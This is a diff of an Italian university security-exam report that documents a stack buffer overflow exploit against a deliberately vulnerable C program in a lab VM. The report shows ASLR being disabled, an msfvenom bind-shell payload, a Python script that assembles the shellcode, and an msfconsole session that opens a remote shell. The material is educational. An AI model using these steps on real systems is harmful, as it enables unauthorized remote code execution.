@@ -6,51 +6,51 @@
 \vspace{0.5cm}
 
 Progetto per l'esame di Sicurezza.\\
-Facolta' di Ingegneria Informatica, Informatica e Statistica.
+Facoltà di Ingegneria Informatica, Informatica e Statistica.
 
 \vspace{0.5cm}
-Simone Gentili - 1977848\\
-Alessandra Zavaleta - 2145832\\
-Fatima - ? ?\\
+Gentili Simone - 1977848\\
+Zavaleta Alessandra - 2145832\\
+Kourahi Fatima - 2130726\\
 \end{center}
 
 ## Introduzione
 Con il termine "buffer overflow" o "buffer overrun" ci si riferisce al
-fenomeno in cui un processo scrive piu' dati all'interno di un buffer
+fenomeno in cui un processo scrive più dati all'interno di un buffer
 di quanti quest'ultimo riesca a contenere, sovrascrivendo le zone di
 memoria adiacenti.\
 
-L'obiettivo del progetto e' di sfruttare una vulnerabilita' Stack
-Buffer Overflow, un particolare tipo di buffer overflow che prende luogo
+L'obiettivo del progetto è di sfruttare una vulnerabilità Stack
+Buffer Overflow, un particolare tipo di buffer overflow che ha luogo
 all'interno della porzione di memoria dedicata allo stack di un processo,
 al fine di ottenere una shell sul sistema vulnerabile.
 
 ## Requisiti
-Al fine di raggiungere l'obiettivo richiesto, le seguenti entita' software sono state
+Al fine di raggiungere l'obiettivo richiesto, le seguenti entità software sono state
 predisposte:\
 - Programma vulnerabile\
 - Sistema Operativo vulnerabile\
 - Exploit
 
 ## Programma vulnerabile
-Il programma in oggetto e' stata opportunamente realizzato facendo uso del
+Il programma in oggetto è stato opportunamente realizzato facendo uso del
 linguaggio di programmazione C (GCC 16.1.1). Tale applicazione permette ai suoi
 utenti di formattare testo in modo personalizzato e legge il testo da formattare
-dallo standard input. Quando l'input fornito eccede la capacita' del buffer,
-adoperato dal programma per contenerlo, uno stack buffer overflow si verifica.
+dallo standard input. Quando l'input fornito eccede la capacità del buffer,
+adoperato dal programma per contenerlo, si verifica uno stack buffer overflow.
 
 L'utilizzo del linguaggio di programmazione C per l'implementazione del programma
-vulnerabile e' strettamente legato alle caratteristiche del mesimo. Nello specifico,
-il compilatore utilizzato per la generazione del codice macchina, non introduce
+vulnerabile è strettamente legato alle caratteristiche del medesimo. Nello specifico,
+il compilatore utilizzato per la generazione del codice macchina non introduce
 alcun controllo sugli accessi in lettura e scrittura della memoria, rendendolo
 quindi adatto agli scopi del progetto.
 
 La seguente porzione di codice sorgente, utilizzata internamente dal programma in
-oggetto, mostra la presenza di una vulnerabilita' SBO in corrispondenza della
+oggetto, mostra la presenza di una vulnerabilità SBO in corrispondenza della
 funzione strcpy. Quest'ultima copia il contenuto del secondo argomento (buf) all'interno
 del primo argomento (vulnbuf). Non effettuando alcun controllo sulla lunghezza degli
-input, la funzione strcpy puo' copiare piu' dati di quanti il buffer di destinazione
-e' in grado di contenere.
+input, la funzione strcpy può copiare più dati di quanti il buffer di destinazione
+sia in grado di contenere.
 
 ```c
   char vulnbuf[256];
@@ -67,8 +67,8 @@ e' in grado di contenere.
 ```
 
 In particolare, se la lunghezza dell'input supera i 255 bytes, l'invocazione del codice
-sopra mostrato, provoca un overflow nel buffer vulnbuf. Affinche' sia possibile
-sfruttare tale overflow per incontrare le richieste del progetto, le seguenti opzioni
+sopra mostrato provoca un overflow nel buffer vulnbuf. Affinché sia possibile
+sfruttare tale overflow per soddisfare le richieste del progetto, le seguenti opzioni
 di compilazione sono state fornite al compilatore:\
 \textbf{-z execstack}\
 *Abilita l'esecuzione di codice nello stack*\
@@ -78,28 +78,28 @@ di compilazione sono state fornite al compilatore:\
 *Genera un eseguibile con indirizzi fissi nel segmento del codice*
 
 ## Sistema Operativo vulnerabile
-Per ragioni di praticita' e presentazione, una Virtual Machine e' stata installata e
-configurata. A tal proposito, un sistema operativo basato sul kernel Linux e' stato
+Per ragioni di praticità e presentazione, una Virtual Machine è stata installata e
+configurata. A tal proposito, un sistema operativo basato sul kernel Linux è stato
 utilizzato e la randomizzazione del layout dello spazio di indirizzi dei processi (ASLR)
-disattivata con il seguente comando shell:
+è stata disattivata con il seguente comando shell:
 
 ```sh
 echo 0 > /proc/sys/kernel/randomize_va_space
 ```
 
-La disattivazione di ASLR e' necessaria, specialmente in architetture a 64 bit, per
+La disattivazione di ASLR è necessaria, specialmente in architetture a 64 bit, per
 rendere deterministico il posizionamento dello spazio di indirizzi di un processo,
 indispensabile per l'esecuzione dell'exploit.
 
 ## L'exploit
 Nello sviluppo dell'exploit sono stati utilizzati diversi strumenti, come gdb e metasploit.
-Il GNU debugger (gdb) e' stato utilizzato per analizzare, verificare e testare la
-vulnerabilita': dapprima utilizzando campioni di input utili a mostrare la sovrascrittura
-dell'indirizzo di ritorno salvato nello stack (facendo uso di one-liner perl) e dopo,
+Il GNU debugger (gdb) è stato utilizzato per analizzare, verificare e testare la
+vulnerabilità: dapprima utilizzando campioni di input utili a mostrare la sovrascrittura
+dell'indirizzo di ritorno salvato nello stack (facendo uso di one-liner perl) e poi,
 fornendo in input l'exploit opportunamente costruito.
-Al fine di stabilire l'esatta distanza tra l'indizzo base del buffer e l'indirizzo di
-ritorno (necessaria a stabilire la corretta dimensione dello shellcode) l'analisi del
-codice disassemblato della funzione vulnerabile e' stata effettuata.
+Al fine di stabilire l'esatta distanza tra l'indirizzo base del buffer e l'indirizzo di
+ritorno (necessaria a stabilire la corretta dimensione dello shellcode), è stata effettuata
+l'analisi del codice disassemblato della funzione vulnerabile.
 
 ```asm
 push   %rbp
@@ -117,43 +117,43 @@ ret
 
 Come mostrato in figura, il primo argomento della funzione strcpy (rdi) corrisponde
 all'indirizzo base del buffer di interesse.
-Il contenuto del registro rdi e' stato calcolato sottraendo al base pointer (rbp) il
+Il contenuto del registro rdi è stato calcolato sottraendo al base pointer (rbp) il
 valore esadecimale 120, che in decimale corrisponde a 288. Quest'ultimo valore rappresenta
 il numero di bytes necessari a raggiungere il base pointer salvato nello stack a partire
 dall'indirizzo del buffer.
 Per raggiungere l'indirizzo di ritorno (salvato dall'istruzione call al momento della
-invocazione della funzione) 8 bytes di base pointer deveno essere conteggiati ai 288 bytes
+invocazione della funzione), 8 bytes di base pointer devono essere conteggiati ai 288 bytes
 calcolati in precedenza, per un totale di 296 bytes.
-Dopo il calcolo della distanza e' stato possibile generare il payload, compito svolto con
+Dopo il calcolo della distanza è stato possibile generare il payload, compito svolto con
 l'ausilio del framework Metasploit. Il seguente comando shell produce un payload avente
-una lunghezza di 119 bytes e compatibile con il sistema operativo e architettura del
-sistema terget. Una volta eseguito, il payload esegue i seguenti passaggi:\
-- Crea un socket TCP in ascolto sulla porta 4444 ad attende una connessione\
-- Mappa 4096 bytes nella memoria del processo\
-- Attende la ricezione di dati e li salva all'interno della memoria mappata\
-- Esegue i dati salvati
+una lunghezza di 119 bytes e compatibile con il sistema operativo ed architettura del
+sistema target. Una volta eseguito, il payload esegue i seguenti passaggi:\
+
+1. Crea un socket TCP in ascolto sulla porta 4444 e attende una connessione
+2. Mappa 4096 bytes nella memoria del processo
+3. Attende la ricezione di dati e li salva all'interno della memoria mappata
+4. Esegue i dati salvati
 
 ```sh
-msfvenom \
-    --platform linux \
-    --arch x64 \
-    --bad-chars '\x00' \
-    --payload linux/x64/shell/bind_tcp \
-    --format python
+msfvenom --platform linux \
+         --arch x64 \
+         --bad-chars '\x00' \
+         --payload linux/x64/shell/bind_tcp \
+         --format python
 ```
 
 L'opzione --bad-chars '\\x00' istruisce msfvenom di non utilizzare il null byte
-(0x00) all'interno del payload. Questa opzione è necessaria in quanto, lo shellcode viene
+(0x00) all'interno del payload. Questa opzione è necessaria in quanto lo shellcode viene
 copiato nel buffer dalla funzione strcpy. Essendo strcpy progettata per copiare stringhe
 terminate dal carattere nullo, la presenza di un null byte all'interno del payload
 farebbe terminare anticipatamente la copia. Di conseguenza, solo una parte del payload
 verrebbe copiata nel buffer, compromettendone il corretto funzionamento.\
 
-Dopo aver creato il payload, resta da calcolare la lunghezza del nop sled, padding ed il nuovo
+Dopo aver creato il payload, resta da calcolare la lunghezza del nop sled, padding e il nuovo
 indirizzo di ritorno. 60 bytes di nop sled sono stati utilizzati, lasciando quindi 117 bytes
 di padding. Infine, per calcolare il nuovo indirizzo di ritorno, l'analisi della
-porzione di memoria dello stack, successivamente alla chiamata della funzione strcpy,
-e' stata effettuata.
+porzione di memoria dello stack successivamente alla chiamata della funzione strcpy
+è stata effettuata.
 
 ```sh
 ...
@@ -174,7 +174,7 @@ e' stata effettuata.
 
 Dalla porzione di memoria mostrata risulta che l'indirizzo 0x7fffffffe826 costituisce
 un valido candidato per sovrascrivere l'indirizzo di ritorno salvato nello stack.
-Un script in Python e' stato realizzato per mettere insieme i componenti dello shellcode.
+Uno script in Python è stato realizzato per mettere insieme i componenti dello shellcode.
 
 ```python
 import sys
@@ -201,10 +201,12 @@ sys.stdout.buffer.write(nopsled + buf + padding + address)
 ```
 
 ## Esecuzione dell'exploit
-Dopo aver realizzato le 3 entita' richieste e' stato possibile lanciare l'attacco.
-L'attaco e' strutturato in 2 fasi.
+
+Dopo aver realizzato le 3 entità richieste è stato possibile lanciare l'attacco.
+L'attacco è strutturato in 2 fasi.
 
 ### Fase 1
+
 In questa fase, il programma vulnerabile viene eseguito fornendo in input lo shellcode
 generato in precedenza. Sulla VM predisposta viene quindi eseguito il seguente comando.
 
@@ -212,11 +214,12 @@ generato in precedenza. Sulla VM predisposta viene quindi eseguito il seguente c
 payload-gen.py | ftext
 ```
 
-Quando eseguito con successo, il comando esposto provochera' l'esecuzione del payload
-e alla predisposizione della fase 2.
+Quando eseguito con successo, il comando esposto provocherà l'esecuzione del payload
+e la predisposizione della fase 2.
 
 ### Fase 2
-In quest'ultima fase, msfconsole, uno strumento del framework Metasploit, e' stato
+
+In quest'ultima fase, msfconsole, uno strumento del framework Metasploit, è stato
 utilizzato per connetterci al socket TCP aperto nella fase 1 e l'esecuzione del secondo
 payload, un codice di 38 bytes che ci permette di ottenere una shell sulla virtual machine.
 
@@ -240,9 +243,8 @@ ospitante la VM con indirizzo 192.168.122.1.
 ```sh
 [*] Started bind TCP handler against 192.168.122.21:4444
 [*] Sending stage (38 bytes) to 192.168.122.21
-[*] Command shell session 1 opened (192.168.122.1:39189 -> 192.168.122.21:4444) at 2026-06-30 20:25:08 +0200
+[*] Command shell session 1 opened (192.168.122.1:39189 -> 192.168.122.21:4444)
 ```
 
-A questo punto e' possibile eseguire comandi arbitrari sul sistema target da una connessione
-remota, con i medisimi permessi del programma vulnerabile, realizzando quindi le richieste
-del progetto.
+A questo punto è possibile eseguire comandi arbitrari sul sistema target da una connessione
+remota, con i medesimi permessi del programma vulnerabile, realizzando quindi le richieste del progetto.
